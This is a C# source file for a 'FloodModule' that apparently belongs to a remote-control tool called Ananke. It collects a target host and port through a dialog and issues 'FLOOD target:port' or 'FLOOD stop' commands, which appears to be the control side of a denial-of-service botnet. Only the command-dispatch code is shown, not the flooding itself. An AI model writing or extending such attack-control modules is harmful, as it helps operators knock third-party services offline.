using System;
using System.Windows.Forms;
using Ananke.Forms;

namespace Ananke.Modules {
    public class FloodModule : IControlModule {
        public string Identifier => "FLOOD";

        public string Activate() {
            FloodForm form = new FloodForm();
            DialogResult result = form.ShowDialog();
            if(result == DialogResult.OK) {
                return String.Format("{0} {1}:{2}", Identifier, form.Target, form.Port);
            } else if(result == DialogResult.Abort) {
                return String.Format("{0} stop", Identifier);
            }

            return null;
        }

        public void ResponseReceived(string response) {}
    }
}
